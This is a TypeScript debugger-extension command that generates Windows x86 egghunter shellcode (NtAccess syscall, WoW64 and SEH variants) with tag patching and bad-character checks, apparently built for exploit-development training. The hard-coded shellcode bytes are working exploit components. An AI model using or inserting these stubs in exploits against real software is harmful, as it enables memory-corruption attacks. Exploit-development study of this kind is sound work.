import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

type EggMode = "ntaccess" | "seh";
type EggOS = "win7" | "win10";

const SYSCALL_TABLE: Record<EggOS, number> = {
  win7: 0x02,
  win10: 0x1c9,
};

type EggOptions = {
  tag: string;
  mode: EggMode;
  wow64: boolean;
  badchars: number[];
  os: EggOS;
  syscall: number | null;
};

// NtAccessCheckAndAuditAlarm egghunter (INT 0x2E). 34 bytes.
// Scans page-by-page using the syscall for access checks, then dword-by-dword
// with scasd for double-tag matching.
// Uses mov eax,imm32 for the syscall number so it works with any value
// (Win10 builds use 0x1C9+, which doesn't fit in push imm8).
// Syscall number at offset 8, tag at offset 20.
const NTACCESS_X86: number[] = [
  0x66, 0x81, 0xca, 0xff, 0x0f, // or dx, 0x0fff
  0x42,                         // inc edx
  0x52,                         // push edx
  0xb8, 0xc9, 0x01, 0x00, 0x00, // mov eax, 0x1C9
  0xcd, 0x2e,                   // int 0x2e
  0x3c, 0x05,                   // cmp al, 0x5
  0x5a,                         // pop edx
  0x74, 0xed,                   // je short (back to or dx)
  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
  0x8b, 0xfa,                   // mov edi, edx
  0xaf,                         // scasd
  0x75, 0xe8,                   // jne short (back to inc edx)
  0xaf,                         // scasd
  0x75, 0xe5,                   // jne short (back to inc edx)
  0xff, 0xe7,                   // jmp edi
];

// WoW64 variant: the scanning register is changed from edx to ecx so
// the inc opcode is 0x41 (inc ecx) instead of 0x42 (inc edx), avoiding
// the REX.X prefix byte that breaks in the WoW64 thunk layer.
// All edx references become ecx: or cx, push ecx, pop ecx, mov edi,ecx.
// Syscall number at offset 8, tag at offset 20. 34 bytes.
const NTACCESS_WOW64: number[] = [
  0x66, 0x81, 0xc9, 0xff, 0x0f, // or cx, 0x0fff
  0x41,                         // inc ecx
  0x51,                         // push ecx
  0xb8, 0xc9, 0x01, 0x00, 0x00, // mov eax, 0x1C9
  0xcd, 0x2e,                   // int 0x2e
  0x3c, 0x05,                   // cmp al, 0x5
  0x59,                         // pop ecx
  0x74, 0xed,                   // je short (back to or cx)
  0xb8, 0x54, 0x30, 0x30, 0x57, // mov eax, <TAG>
  0x8b, 0xf9,                   // mov edi, ecx
  0xaf,                         // scasd
  0x75, 0xe8,                   // jne short (back to inc ecx)
  0xaf,                         // scasd
  0x75, 0xe5,                   // jne short (back to inc ecx)
  0xff, 0xe7,                   // jmp edi
];

// SEH-based egghunter. 70 bytes. Position-independent via call $+5/pop.
// Installs a custom exception handler that catches ACCESS_VIOLATION from scasd
// and resumes at the next page. No syscall-number dependency, so it's portable
// across Windows versions.
//
// Layout:
//   [0x00] jmp short install_seh (skip handler)
//   [0x02] handler: reads ContextRecord from stdcall args, computes scan_loop
//          address from EstablisherFrame→Handler, sets Eip, returns
//          EXCEPTION_CONTINUE_EXECUTION.
//   [0x19] install_seh: gets handler address via call/pop, installs SEH frame.
//   [0x2D] scan_loop: or di,0xfff (handler resumes here → next page)
//   [0x32] next_addr: inc edi (jnz resumes here → next dword)
//          mov eax, TAG; scasd; jnz next_addr; scasd; jnz next_addr;
//          restore old SEH; jmp edi.
//
// Tag at offset 0x34. Contains null bytes (offsets 0x13-0x15, 0x1C-0x1F).
const SEH_EGGHUNTER: number[] = [
  // jmp short install_seh
  0xeb, 0x17,
  // handler (offset 0x02, 23 bytes)
  0x8b, 0x4c, 0x24, 0x0c,             // mov ecx, [esp+0x0C]      (ContextRecord)
  0x8b, 0x44, 0x24, 0x08,             // mov eax, [esp+0x08]      (EstablisherFrame)
  0x8b, 0x40, 0x04,                   // mov eax, [eax+0x04]      (handler address)
  0x83, 0xc0, 0x2b,                   // add eax, 0x2B            (scan_loop = handler+43)
  0x89, 0x81, 0xb8, 0x00, 0x00, 0x00, // mov [ecx+0xB8], eax     (set Eip = scan_loop)
  0x31, 0xc0,                         // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
  0xc3,                               // ret
  // install_seh (offset 0x19)
  0x31, 0xd2,                         // xor edx, edx
  0xe8, 0x00, 0x00, 0x00, 0x00,       // call $+5
  0x5e,                               // pop esi                  (esi = addr of this pop)
  0x83, 0xee, 0x1e,                   // sub esi, 0x1E            (esi = handler addr)
  0x56,                               // push esi                 (handler)
  0x64, 0xff, 0x32,                   // push dword ptr fs:[edx]  (old SEH)
  0x64, 0x89, 0x22,                   // mov dword ptr fs:[edx], esp
  0x31, 0xff,                         // xor edi, edi             (scan from 0)
  // scan_loop (offset 0x2D) — handler resumes here (next page)
  0x66, 0x81, 0xcf, 0xff, 0x0f,       // or di, 0x0FFF
  // next_addr (offset 0x32) — jnz resumes here (next dword)
  0x47,                               // inc edi
  0xb8, 0x54, 0x30, 0x30, 0x57,       // mov eax, <TAG>           (tag at offset 0x34)
  0xaf,                               // scasd
  0x75, 0xf7,                         // jnz next_addr            (0x32)
  0xaf,                               // scasd
  0x75, 0xf4,                         // jnz next_addr            (0x32)
  // found — restore old SEH and jump
  0x64, 0x8f, 0x02,                   // pop dword ptr fs:[edx]
  0x83, 0xc4, 0x04,                   // add esp, 0x04
  0xff, 0xe7,                         // jmp edi
];

const TAG_OFFSET_NTACCESS = 20;
const TAG_OFFSET_NTACCESS_WOW64 = 20;
const TAG_OFFSET_SEH = 0x34;

const SYSCALL_OFFSET_NTACCESS = 8;
const SYSCALL_OFFSET_NTACCESS_WOW64 = 8;

function uniqueBytes(values: number[] | undefined): number[] {
  const seen = new Set<number>();
  for (const v of values ?? []) {
    if (Number.isInteger(v) && v >= 0 && v <= 0xff) seen.add(v & 0xff);
  }
  return [...seen].sort((a, b) => a - b);
}

function checkBadchars(bytes: number[], label: string, badSet: Set<number>): string[] {
  const hits: string[] = [];
  for (let i = 0; i < bytes.length; i++) {
    if (badSet.has(bytes[i])) {
      hits.push(`byte 0x${bytes[i].toString(16).toUpperCase().padStart(2, "0")} at offset ${i} in ${label}`);
    }
  }
  return hits;
}

function tagBytes(tag: string): number[] {
  return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
}

function dwordLE(val: number): number[] {
  return [val & 0xff, (val >> 8) & 0xff, (val >> 16) & 0xff, (val >> 24) & 0xff];
}

export function buildEgghunter(options: EggOptions): { bytes: number[]; size: number; badcharHits: string[]; syscallUsed: number | null } {
  const tag = tagBytes(options.tag);
  const badSet = new Set(uniqueBytes(options.badchars));

  let template: number[];
  let tagOffset: number;
  let syscallOffset: number | null = null;
  let label: string;

  if (options.mode === "seh") {
    template = [...SEH_EGGHUNTER];
    tagOffset = TAG_OFFSET_SEH;
    label = "seh egghunter";
  } else if (options.wow64) {
    template = [...NTACCESS_WOW64];
    tagOffset = TAG_OFFSET_NTACCESS_WOW64;
    syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
    label = "ntaccess wow64 egghunter";
  } else {
    template = [...NTACCESS_X86];
    tagOffset = TAG_OFFSET_NTACCESS;
    syscallOffset = SYSCALL_OFFSET_NTACCESS;
    label = "ntaccess egghunter";
  }

  template.splice(tagOffset, 4, ...tag);

  let syscallUsed: number | null = null;
  if (syscallOffset !== null) {
    const sysnum = options.syscall ?? SYSCALL_TABLE[options.os];
    template.splice(syscallOffset, 4, ...dwordLE(sysnum));
    syscallUsed = sysnum;
  }

  const badcharHits = checkBadchars(template, label, badSet);
  return { bytes: template, size: template.length, badcharHits, syscallUsed };
}

function bytesToHex(bytes: number[]): string {
  return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
}

function bytesToPython(bytes: number[]): string {
  return `b"${bytes.map((v) => `\\x${v.toString(16).padStart(2, "0")}`).join("")}"`;
}

export function createEgghunterCommand(): Command {
  return {
    name: "egghunter",
    description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
    usage: "dx @$osed().egghunter(tag?, mode?, wow64?, badchars?, os?, syscall?)",
    examples: [
      'dx @$osed().egghunter("W00T")',
      'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win7")',
      'dx @$osed().egghunter("B33F", "seh")',
      'dx @$osed().egghunter("W00T", "ntaccess", true)',
      'dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D")',
      'dx @$osed().egghunter("W00T", "ntaccess", false, "", "win10", 0x1c9)',
    ],
    schema: {
      tag: { type: "string", default: "W00T" },
      mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
      wow64: { type: "boolean", default: false },
      badchars: { type: "array", default: [] },
      os: { type: "string", enum: ["win7", "win10"], default: "win10" },
      syscall: { type: "number", default: null },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const opts: EggOptions = {
        tag: (options.tag as string) ?? "W00T",
        mode: (options.mode as EggMode) ?? "ntaccess",
        wow64: (options.wow64 as boolean) ?? false,
        badchars: (options.badchars as number[]) ?? [],
        os: (options.os as EggOS) ?? "win10",
        syscall: (options.syscall as number | null) ?? null,
      };

      const result = buildEgghunter(opts);

      out.section("Egghunter");
      const sysLabel = result.syscallUsed !== null ? ` | Syscall: 0x${result.syscallUsed.toString(16).toUpperCase()} (${opts.os})` : "";
      out.info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result.size} bytes${sysLabel}`);
      out.print(bytesToHex(result.bytes));
      out.print(bytesToPython(result.bytes));
      if (result.badcharHits.length > 0) {
        for (const hit of result.badcharHits) {
          out.warn(`Badchar: ${hit}`);
        }
      }

      return {
        command: "egghunter",
        args: options,
        success: result.badcharHits.length === 0,
        findings: [result],
        warnings: result.badcharHits,
        errors: [],
      };
    },
  };
}
